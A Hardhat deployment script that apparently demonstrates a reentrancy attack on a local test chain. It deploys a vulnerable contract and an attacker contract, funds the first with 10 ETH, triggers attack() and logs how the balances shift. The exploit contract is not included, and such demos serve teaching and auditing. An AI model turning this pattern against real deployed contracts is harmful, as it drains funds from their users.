const hre = require("hardhat");

async function main() {
    const [deployer, attacker] = await hre.ethers.getSigners();
    const Vulnerable = await hre.ethers.getContractFactory("Vulnerable", deployer);
    const Attacker = await hre.ethers.getContractFactory("Attacker", attacker);

    // Deploy vulnerable contract
    const vul = await Vulnerable.deploy();
    await vul.deployTransaction.wait();  // Wait for the deployment transaction to be mined
    console.log(`Vulnerable contract deployed at: ${vul.address}`);

    if (!vul.address) {
        console.error("Failed to deploy Vulnerable contract. Address is undefined.");
        return;
    }

    // Deploy attacker contract
    const attackerContract = await Attacker.deploy(vul.address);
    await attackerContract.deployTransaction.wait(); // Wait for the attacker contract deployment transaction to be mined
    console.log(`Attacker contract deployed at: ${attackerContract.address}`);

    // Send 10 ETH to the vulnerable contract from the deployer
    const tx = await deployer.sendTransaction({
        to: vul.address,
        value: ethers.utils.parseEther("10")
    });
    await tx.wait();
    console.log("Funded 10 ETH to vulnerable contract");

    const provider = hre.ethers.provider;

    // Check the balances before attack
    const vulBalanceBefore = await provider.getBalance(vul.address);
    const attBalanceBefore = await provider.getBalance(attacker.address);
    console.log("Before attack:");
    console.log("Vulnerable balance:", ethers.utils.formatEther(vulBalanceBefore), "ETH");
    console.log("Attacker Balance:", ethers.utils.formatEther(attBalanceBefore), "ETH");

    // Execute the attack
    const attackTx = await attackerContract.connect(attacker).attack({
        value: ethers.utils.parseEther("1"),
        gasLimit: 1000000  // Increased gas limit for reentrancy
    });
    await attackTx.wait();
    console.log("Attacked!");

    // Check the balances after the attack
    const vulBalanceAfter = await provider.getBalance(vul.address);
    const attBalanceAfter = await provider.getBalance(attacker.address);
    console.log("After attack:");
    console.log("Vulnerable balance:", ethers.utils.formatEther(vulBalanceAfter), "ETH");
    console.log("Attacker Balance:", ethers.utils.formatEther(attBalanceAfter), "ETH");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
